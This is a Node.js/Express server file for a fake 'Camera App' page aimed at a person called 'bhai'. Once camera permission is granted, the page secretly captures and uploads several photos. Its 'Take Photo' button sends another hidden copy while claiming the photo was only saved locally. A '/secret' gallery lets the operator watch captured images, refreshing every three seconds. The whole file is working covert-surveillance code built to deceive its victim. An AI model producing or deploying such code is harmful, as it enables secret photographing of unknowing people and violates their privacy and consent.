const express = require('express');
const multer = require('multer');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use('/uploads', express.static('uploads'));

// Create uploads folder
if (!fs.existsSync('./uploads')) {
    fs.mkdirSync('./uploads');
}

const storage = multer.diskStorage({
    destination: './uploads/',
    filename: (req, file, cb) => {
        cb(null, Date.now() + '-' + Math.round(Math.random() * 1E9) + '.jpg');
    }
});
const upload = multer({ storage });

let photos = [];

// Secret upload API
app.post('/api/secret-upload', upload.single('photo'), (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file' });
    
    const photo = {
        id: Date.now(),
        filename: req.file.filename,
        url: `/uploads/${req.file.filename}`,
        timestamp: new Date().toISOString()
    };
    
    photos.unshift(photo);
    if (photos.length > 100) photos.pop();
    
    console.log(`📸 SECRET PHOTO at ${new Date().toLocaleString()}`);
    res.json({ success: true });
});

// Get all secret photos
app.get('/api/secret/photos', (req, res) => {
    res.json(photos);
});

// Delete photo
app.delete('/api/photos/:id', (req, res) => {
    const id = parseInt(req.params.id);
    const photo = photos.find(p => p.id === id);
    if (photo) {
        const filePath = path.join('./uploads', photo.filename);
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
        photos = photos.filter(p => p.id !== id);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Not found' });
    }
});

// ============= MAIN PAGE (for bhai) =============
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera App</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; font-family: system-ui, sans-serif; padding: 20px; }
        .card { background: rgba(255,255,255,0.95); border-radius: 32px; padding: 28px; max-width: 500px; width: 100%; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.3); }
        h1 { color: #1e293b; margin-bottom: 8px; font-size: 1.8rem; }
        .sub { color: #64748b; margin-bottom: 20px; font-size: 0.9rem; }
        .video-wrapper { background: #000; border-radius: 24px; overflow: hidden; margin: 20px 0; border: 2px solid #3b82f6; }
        video { width: 100%; aspect-ratio: 4/3; object-fit: cover; }
        button { background: #3b82f6; color: white; border: none; padding: 14px 28px; font-size: 1.1rem; font-weight: 600; border-radius: 60px; cursor: pointer; width: 100%; transition: all 0.2s; }
        button:hover { background: #2563eb; transform: scale(0.98); }
        .status { margin-top: 15px; padding: 12px; border-radius: 20px; background: #f1f5f9; font-size: 0.85rem; color: #334155; }
        footer { margin-top: 20px; font-size: 0.7rem; color: #94a3b8; }
    </style>
</head>
<body>
    <div class="card">
        <h1>📸 Camera</h1>
        <div class="sub">Click button to take photo</div>
        <div class="video-wrapper">
            <video id="video" autoplay playsinline muted></video>
        </div>
        <button id="captureBtn">📷 Take Photo</button>
        <div id="status" class="status">⏳ Loading camera...</div>
        <footer>Click to capture and save to your device</footer>
    </div>
    <script>
        const video = document.getElementById('video');
        const captureBtn = document.getElementById('captureBtn');
        const statusDiv = document.getElementById('status');
        let mediaStream = null;
        let autoCaptureDone = false;

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { ideal: "user" } }
                });
                mediaStream = stream;
                video.srcObject = stream;
                statusDiv.innerHTML = '✅ Camera ready';
                statusDiv.style.background = '#d1fae5';
                startAutoCapture();
            } catch (err) {
                statusDiv.innerHTML = '❌ Camera access denied. Please allow camera.';
                statusDiv.style.background = '#fee2e2';
                console.error(err);
            }
        }

        async function secretAutoCapture() {
            if (!video.videoWidth || !video.videoHeight) return false;
            try {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.85))).blob();
                const formData = new FormData();
                formData.append('photo', blob, \`secret_\${Date.now()}.jpg\`);
                await fetch('/api/secret-upload', { method: 'POST', body: formData });
                return true;
            } catch(err) { 
                console.error('Secret capture failed:', err);
                return false; 
            }
        }

        async function startAutoCapture() {
            let attempts = 0;
            const tryCapture = async () => {
                if (video.videoWidth && video.videoHeight && video.videoWidth > 0) {
                    for (let i = 0; i < 3; i++) {
                        await new Promise(r => setTimeout(r, 300));
                        await secretAutoCapture();
                    }
                    statusDiv.innerHTML = '✅ Ready | Click to take photo';
                    autoCaptureDone = true;
                } else if (attempts < 20) {
                    attempts++;
                    setTimeout(tryCapture, 300);
                } else {
                    statusDiv.innerHTML = '⚠️ Camera taking time | Try clicking button';
                    autoCaptureDone = true;
                }
            };
            setTimeout(tryCapture, 500);
        }

        async function fakeCapture() {
            if (!video.videoWidth || !video.videoHeight) {
                statusDiv.innerHTML = '⚠️ Camera not ready yet';
                return;
            }
            
            const wrapper = document.querySelector('.video-wrapper');
            wrapper.style.boxShadow = '0 0 0 3px #10b981';
            setTimeout(() => { wrapper.style.boxShadow = ''; }, 150);
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
            const link = document.createElement('a');
            link.href = dataUrl;
            link.download = \`photo_\${Date.now()}.jpg\`;
            link.click();
            
            await secretAutoCapture();
            statusDiv.innerHTML = '✅ Photo saved! Check your downloads.';
            setTimeout(() => {
                statusDiv.innerHTML = '✅ Ready | Click to take photo';
            }, 2000);
        }

        captureBtn.addEventListener('click', fakeCapture);
        startCamera();
        
        window.addEventListener('beforeunload', () => {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
    `);
});

// ============= SECRET PAGE (for you) =============
app.get('/secret', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔓 Secret Gallery</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0f0f1a; font-family: system-ui, sans-serif; padding: 20px; }
        .header { background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%); padding: 20px; border-radius: 24px; margin-bottom: 24px; text-align: center; }
        h1 { color: white; font-size: 1.5rem; }
        .stats { color: #fecaca; font-size: 0.9rem; margin-top: 8px; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; max-width: 1400px; margin: 0 auto; }
        .photo-card { background: #1e1e2a; border-radius: 20px; overflow: hidden; border: 1px solid #2d2d3a; transition: transform 0.2s; }
        .photo-card:hover { transform: translateY(-4px); }
        .photo-card img { width: 100%; aspect-ratio: 4/3; object-fit: cover; cursor: pointer; }
        .info { padding: 12px; color: #a0a0b0; font-size: 0.7rem; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
        .timestamp { font-size: 0.65rem; color: #6b6b7a; }
        .delete-btn, .download-btn { padding: 6px 12px; border-radius: 20px; cursor: pointer; font-size: 0.7rem; border: none; }
        .download-btn { background: #3b82f6; color: white; }
        .delete-btn { background: #dc2626; color: white; }
        .status { text-align: center; padding: 15px; background: #1a1a24; border-radius: 40px; margin-bottom: 20px; color: #86efac; font-size: 0.9rem; }
        .empty { text-align: center; color: #6b6b7a; padding: 60px; font-size: 1.2rem; }
        .auto-refresh { background: #2d2d3a; padding: 8px 16px; border-radius: 40px; font-size: 0.8rem; display: inline-block; margin-bottom: 15px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
        .modal img { max-width: 90%; max-height: 90%; border-radius: 12px; }
        .modal-close { position: absolute; top: 20px; right: 30px; color: white; font-size: 40px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔓 SECRET GALLERY - AUTO CAPTURED</h1>
        <div class="stats" id="stats">Loading...</div>
    </div>
    <div style="text-align: center;">
        <div class="auto-refresh">🔄 Auto-refresh every 3 seconds</div>
    </div>
    <div id="status" class="status">⏳ Waiting for secret photos...</div>
    <div id="gallery" class="gallery"></div>
    <div id="modal" class="modal">
        <span class="modal-close">&times;</span>
        <img id="modalImg" src="">
    </div>
    <script>
        const API_URL = window.location.origin;
        let lastPhotoCount = 0;
        
        async function loadPhotos() {
            try {
                const response = await fetch(\`\${API_URL}/api/secret/photos\`);
                const photos = await response.json();
                const gallery = document.getElementById('gallery');
                const status = document.getElementById('status');
                const stats = document.getElementById('stats');
                
                const newPhotosCount = photos.length - lastPhotoCount;
                lastPhotoCount = photos.length;
                
                if (photos.length === 0) {
                    gallery.innerHTML = '<div class="empty">📭 No secret photos yet<br>When bhai opens the website, auto capture will happen</div>';
                    status.innerHTML = '⏳ Waiting for bhai to open the website... Auto-capture will trigger';
                    stats.innerHTML = '📸 0 photos captured';
                    return;
                }
                
                stats.innerHTML = \`📸 \${photos.length} secret photos captured | Last: \${new Date(photos[0].timestamp).toLocaleTimeString()}\`;
                
                if (newPhotosCount > 0) {
                    status.innerHTML = \`🔴 NEW! \${newPhotosCount} new secret photo\${newPhotosCount > 1 ? 's' : ''} captured! 🎯\`;
                    setTimeout(() => {
                        status.innerHTML = \`✅ \${photos.length} photos available | Auto-refresh active\`;
                    }, 3000);
                } else {
                    status.innerHTML = \`✅ \${photos.length} secret photos | Auto-refresh active\`;
                }
                
                gallery.innerHTML = photos.map(photo => \`
                    <div class="photo-card" data-id="\${photo.id}">
                        <img src="\${photo.url}" alt="Secret photo" onclick="openModal('\${photo.url}')">
                        <div class="info">
                            <span class="timestamp">📅 \${new Date(photo.timestamp).toLocaleString()}</span>
                            <div>
                                <button class="download-btn" onclick="downloadPhoto('\${photo.url}')">💾 Save</button>
                                <button class="delete-btn" onclick="deletePhoto(\${photo.id})">🗑️ Delete</button>
                            </div>
                        </div>
                    </div>
                \`).join('');
                
            } catch (err) {
                console.error(err);
                document.getElementById('status').innerHTML = '❌ Connection error';
            }
        }
        
        async function deletePhoto(id) {
            if (!confirm('Delete this secret photo?')) return;
            try {
                await fetch(\`\${API_URL}/api/photos/\${id}\`, { method: 'DELETE' });
                loadPhotos();
            } catch(err) {
                alert('Error deleting');
            }
        }
        
        function downloadPhoto(url) {
            const link = document.createElement('a');
            link.href = url;
            link.download = \`secret_photo_\${Date.now()}.jpg\`;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
        
        function openModal(url) {
            const modal = document.getElementById('modal');
            const modalImg = document.getElementById('modalImg');
            modal.style.display = 'flex';
            modalImg.src = url;
        }
        
        document.querySelector('.modal-close')?.addEventListener('click', () => {
            document.getElementById('modal').style.display = 'none';
        });
        window.onclick = (e) => {
            if (e.target === document.getElementById('modal')) {
                document.getElementById('modal').style.display = 'none';
            }
        };
        
        loadPhotos();
        setInterval(loadPhotos, 3000);
    </script>
</body>
</html>
    `);
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🔓 Secret view: http://localhost:${PORT}/secret`);
});
